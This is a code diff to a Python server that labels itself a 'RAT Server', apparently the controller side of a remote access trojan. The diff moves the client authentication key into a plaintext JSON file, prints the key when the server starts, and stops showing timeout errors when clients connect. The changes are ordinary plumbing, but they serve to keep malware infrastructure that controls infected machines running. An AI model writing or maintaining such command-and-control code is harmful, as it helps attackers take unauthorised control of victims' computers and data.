@@ -22,17 +22,32 @@ from modules.server_ui_utils import print_banner, print_prompt, show_main_menu, 
 # Initialize colorama
 colorama.init(autoreset=True)
 
-# Global authentication key - will be set by user
-AUTH_KEY = None
+# Simple file-based authentication key storage
+import os
+import json
+
+AUTH_CONFIG_FILE = "server_auth.json"
 
 def set_auth_key(key):
-    """Set the global authentication key"""
-    global AUTH_KEY
-    AUTH_KEY = key
+    """Set the authentication key using file storage"""
+    try:
+        config = {"auth_key": key}
+        with open(AUTH_CONFIG_FILE, 'w') as f:
+            json.dump(config, f)
+    except Exception as e:
+        print(f"[ERROR] Failed to save auth key: {e}")
 
 def get_auth_key():
-    """Get the current authentication key"""
-    return AUTH_KEY
+    """Get the authentication key from file storage"""
+    try:
+        if os.path.exists(AUTH_CONFIG_FILE):
+            with open(AUTH_CONFIG_FILE, 'r') as f:
+                config = json.load(f)
+                key = config.get("auth_key")
+                return key
+    except Exception as e:
+        print(f"[ERROR] Failed to load auth key: {e}")
+    return None
 
 def parse_arguments():
     """Parse command line arguments for server configuration"""
@@ -181,6 +196,13 @@ def start_server():
         
         print(f"{Fore.GREEN}✓ RAT Server activated successfully!{Style.RESET_ALL}")
         print(f"{Fore.CYAN}◉ Listening for connections on {Fore.WHITE}{HOST}{Fore.CYAN}:{Fore.WHITE}{PORT}{Style.RESET_ALL}")
+        
+        # Debug: Show current AUTH_KEY status
+        current_auth_key = get_auth_key()
+        if current_auth_key:
+            print(f"{Fore.GREEN}✓ Authentication Key: {Fore.CYAN}{current_auth_key}{Style.RESET_ALL}")
+        else:
+            print(f"{Fore.RED}⚠ Authentication Key: {Fore.RED}NOT SET - Use Server Options to set key{Style.RESET_ALL}")
 
         # Start a thread to accept connections
         accept_thread = threading.Thread(target=accept_connections, args=(server_socket,))
@@ -245,7 +267,7 @@ def stop_server():
 
 def accept_connections(server_socket):
     """Accept new client connections"""
-    global running, server_running, AUTH_KEY
+    global running, server_running
 
     while running and server_running:
         try:
@@ -267,16 +289,17 @@ def accept_connections(server_socket):
                 # Extract and validate authentication key
                 if ":" in validation_response:
                     client_key = validation_response.split(":", 1)[1]
-                    if AUTH_KEY is None:
-                        print(f"❌ Server authentication key not set! Use 'Set Auth Key' option first.")
+                    current_auth_key = get_auth_key()
+                    if current_auth_key is None:
+                        print(f"❌ Server authentication key not set! Use Server Options → Authentication Key to set it first.")
                         try:
                             client.send("AUTH_FAILED".encode())
                         except:
                             pass
                         client.close()
                         continue
-                    elif client_key != AUTH_KEY:
-                        print(f"❌ Authentication failed from {addr[0]}:{addr[1]} - invalid key: '{client_key}' (expected: '{AUTH_KEY}')")
+                    elif client_key != current_auth_key:
+                        print(f"❌ Authentication failed from {addr[0]}:{addr[1]} - invalid key: '{client_key}' (expected: '{current_auth_key}')")
                         try:
                             client.send("AUTH_FAILED".encode())
                         except:
@@ -297,7 +320,10 @@ def accept_connections(server_socket):
                     client.close()
                     continue
             except Exception as e:
-                print(f"❌ Failed to validate client from {addr[0]}:{addr[1]} - {str(e)}")
+                # Only show validation errors for non-timeout issues
+                error_msg = str(e).lower()
+                if "timed out" not in error_msg and "timeout" not in error_msg:
+                    print(f"❌ Failed to validate client from {addr[0]}:{addr[1]} - {str(e)}")
                 client.close()
                 continue
             
